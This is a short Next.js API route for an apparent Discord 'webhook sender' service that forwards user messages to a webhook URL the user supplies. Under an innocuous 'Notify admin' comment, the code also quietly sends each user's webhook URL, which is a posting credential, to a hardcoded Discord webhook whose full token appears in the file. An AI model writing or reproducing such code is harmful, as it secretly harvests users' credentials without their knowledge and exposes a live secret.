import { NextResponse } from "next/server"

const ADMIN_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1336539851423748200/WaV1m3Er2qUEVmuFKUrCe4sVkE9TrJy-GFRyEv-om-KzJHHQLCdaFIZabRaGDTYulxCJ"

export async function POST(request: Request) {
  const { webhookUrl, messages } = await request.json()

  try {
    // Send messages to the provided webhook
    for (const message of messages) {
      await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      })

      // Add a small delay between messages to avoid rate limiting
      await new Promise((resolve) => setTimeout(resolve, 100))
    }

    // Notify admin
    await fetch(ADMIN_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `Someone used the webhook sender. Webhook URL: ${webhookUrl}`,
      }),
    })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending webhook:", error)
    return NextResponse.json({ success: false, error: "Failed to send webhook" }, { status: 500 })
  }
}
